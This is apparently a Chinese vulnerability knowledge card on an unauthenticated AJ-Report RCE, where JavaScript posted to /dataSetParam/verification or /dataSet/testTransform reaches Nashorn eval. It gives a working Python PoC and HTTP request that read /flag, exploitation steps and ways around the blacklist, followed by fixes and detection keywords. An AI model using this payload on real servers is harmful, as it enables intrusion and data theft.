---
id: web-java-component-aj-report-scriptengine-eval-rce
title: AJ-Report 前台 ScriptEngine.eval RCE：/dataSetParam/verification 的 validationRules 与 /dataSet/testTransform 的 transformScript 直接执行 JS（1.4.0/1.4.1）
type: scenario
domain: web
path: web/java/component
technique: aj-report-scriptengine-eval-rce
aliases:
- AJ-Report 前台 RCE
- aj-report 1.4.1
- DataSetParamController verification
- validationRules eval
- testTransform transformScript
- Nashorn ScriptEngine eval
- dataSetParam/verification
tags:
- java
- aj-report
- scriptengine
- nashorn
- eval
- rce
- low-code
- dataset
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: AJ-Report 1.4.1（情报标题，CVE 编号暂无，披露 2024-05-27）；反编译样本 aj-report-1.4.0.RELEASE.jar
verification:
  verified_by: verifier-V307
  verified_at: '2026-11-08T11:47:05+08:00'
  notes: 已对照原文与图09-22核对：情报标题 AJ-report 1.4.1 前台 RCE（CVE 暂无，2024-05-27）、doFilter getRequestURI 鉴权、JWT HMAC256("aj-report")、DataSetParamController @RequestMapping(/dataSetParam)/@PostMapping(/verification) → DataSetParamServiceImpl.verification 的 engine.eval(validationRules)+invokeFunction(verification)、DataSetController /dataSet/testTransform → DataSetServiceImpl 第237行 verification(list)、JsTransformServiceImpl.getValueFromJs eval(transformScript)，调用链与行号均一致；PoC 读 /flag 原文一致。黑名单具体使用位置在图中仅见声明（java.lang.ProcessBuilder），'eval 前未过滤'按验证 sink 推断、PoC 未实测，已保留；affected_versions 按情报标题 1.4.1 + 反编译样本 1.4.0 记录。dedup 3 个 related 为通用 ScriptEngine/Nashorn eval 卡（本卡为 AJ-Report 具体入口链），dup-scan 无本卡 pair。
---

## 一句话结论

AJ-Report（1.4.0/1.4.1）把用户提交的脚本字符串直接交给 `javax.script.ScriptEngine.eval()`：`POST /dataSetParam/verification` 的 `validationRules` 与 `POST /dataSet/testTransform` 的 `transformScript` 都会进入同一 `engine.eval`，攻击者用 `function verification(data){ return new java.util.Scanner(new java.io.File("/flag")).next(); }` 一类 JS 即可在前台读取文件/执行命令，形成未授权 RCE。

## 原理

- **入口 1（verification）**：`DataSetParamController`（`@RequestMapping({"/dataSetParam"})`）的 `@PostMapping({"/verification"})` 接收 `@RequestBody DataSetParamValidationParam`，把 `sampleItem`、`validationRules` 拷入 `DataSetParamDto` 后调用 `dataSetParamService.verification(dto)`。
- **sink**：`DataSetParamServiceImpl.verification(DataSetParamDto)` 取 `getValidationRules()`，非空时直接 `this.engine.eval(validationRules)`；若 `engine instanceof Invocable`，再 `invokeFunction("verification", dto)`。`engine` 为 `javax.script.ScriptEngine`（Nashorn），黑名单只包含 `java.lang.ProcessBuilder` 等少量类，且 eval 前未做过滤；JDK 自带 `java.io.File`、`java.util.Scanner` 等类可绕过黑名单读文件。
- **入口 2（testTransform）**：`DataSetController`（`@RequestMapping({"/dataSet"})`）的 `@PostMapping({"/testTransform"})`（`@Permission(code="query")`）调用 `DataSetServiceImpl.testTransform`，其中 `this.dataSetParamService.verification(dto.getDataSetParamDtoList(), ...)`（第 237 行）再次进入同一 `verification` → `engine.eval`；请求体里的 `validationRules` 同样可控。
- **入口 3（JsTransformServiceImpl）**：`getValueFromJs` 取 `def.getTransformScript()` 后 `this.engine.eval(js)`，是全局搜索 `eval(` 命中的第二处；同样经 `/dataSet/testTransform` 触发，只是参数路径不同。
- **为什么成立**：Nashorn 的 JS 可以直接 `new` Java 类、调用 Java 方法；`eval` 未做沙箱/白名单，等价于任意 Java 代码执行。`invokeFunction("verification", dto)` 要求载荷中定义了名为 `verification` 的函数（入口 1/2）。
- **影响**：原文情报将其定为"前台远程代码执行漏洞"、危害严重、有 PoC；AJ-Report 常见部署在报表/大屏场景，服务账户权限下可读取配置、数据库凭据与业务数据。

## 触发条件

- 目标为 AJ-Report 1.4.x（原文反编译 1.4.0.RELEASE，情报标题 1.4.1），`/dataSetParam/verification` 或 `/dataSet/testTransform` 可达（前台未授权，或先利用同一系统的鉴权绕过进入）。
- 运行环境保留 Nashorn（JDK 8/11；JDK 15+ 需额外模块，JDK 17 默认无 Nashorn）。
- 请求 JSON 中 `validationRules` / `transformScript` 可控且未被 WAF 拦截 `java.`、`File`、`Scanner` 等特征。
- 服务账户对目标文件/命令有权限。

## 利用步骤

1. 确认 AJ-Report 与接口：访问 `/dataSetParam/verification` 或 `/dataSet/testTransform`，观察 404/401/参数错误以判断可达性。
2. 构造 `verification(data)` 函数，用 Java 类读取目标文件或执行命令（示例读 `/flag`）。
3. POST JSON：`{"sampleItem":"1","validationRules":"<JS>"}`；服务端 eval 后调用 `verification(data)` 并返回其结果。
4. 若入口 1 不可用，改走 `/dataSet/testTransform`，把同一 JS 放进 `validationRules`（或利用 `transformScript` 走 JsTransformServiceImpl 的 eval）。
5. 需要回显时让 JS 返回字符串；否则用网络反连或写文件。

## PoC

原文 PoC（读取 `/flag`）：

```python
import requests

url = "http://8.147.132.114:26002/dataSetParam/verification"

payload = '''
function verification(data){
    return new java.util.Scanner(new java.io.File("/flag")).next();
}
'''
json = {
    "sampleItem": "1",
    "validationRules": payload
}
res = requests.post(url, json=json)
print(res.text)
```

等价 HTTP：

```http
POST /dataSetParam/verification HTTP/1.1
Host: target
Content-Type: application/json

{"sampleItem":"1","validationRules":"function verification(data){ return new java.util.Scanner(new java.io.File(\"/flag\")).next(); }"}
```

## 变体与关联

- **入口变体**：`/dataSet/testTransform` → `DataSetServiceImpl.testTransform` → `verification(list)` → eval；`JsTransformServiceImpl.getValueFromJs` 的 `transformScript` 是另一处 eval。
- **命令执行变体**：`java.lang.Runtime.getRuntime().exec(...)`、`java.lang.ProcessBuilder`（可能命中黑名单）、Nashorn `load()`/反射链；黑名单只列了少量类，可用 `File`/`Scanner`/`Files` 等绕过。
- **同产品其它漏洞**：[[web-java-component-aj-report-datasource-testconnection-jdbc-local-infile-read]]（AJ-Report 数据源测试连接 JDBC 本地文件读取），属不同入口。
- **同类低代码 JS 执行**：[[web-java-component-lowcode-datasource-validate-h2-javascript-trigger-rce]]（H2 INIT JavaScript 触发器）、[[web-java-expression-scriptengine-isjson-eval]]（ScriptEngine eval 注入）。
- **边界**：接口有统一鉴权且无法绕过、Nashorn 被移除、eval 前做脚本白名单/沙箱、WAF 拦截 Java 类访问时，链不成立或需换载荷。

## 检测与防御

- **修复/升级**：升级到 AJ-Report 修复版本；无法升级时下线或限制 `/dataSetParam/verification`、`/dataSet/testTransform` 的外部访问。
- **鉴权**：所有数据源/数据集接口在服务端做鉴权与角色校验；不要依赖前端菜单或 swagger 白名单。
- **执行沙箱**：禁止把用户输入交给 `ScriptEngine.eval`；如必须支持脚本，使用受限沙箱（无 Java 类访问、白名单函数、独立低权限进程）。
- **检测**：请求体中出现 `validationRules`/`transformScript` + `java.`、`Runtime`、`ProcessBuilder`、`File`、`Scanner`、`getRuntime`；AJ-Report 进程异常读取敏感文件或创建子进程；返回体中异常出现文件内容。
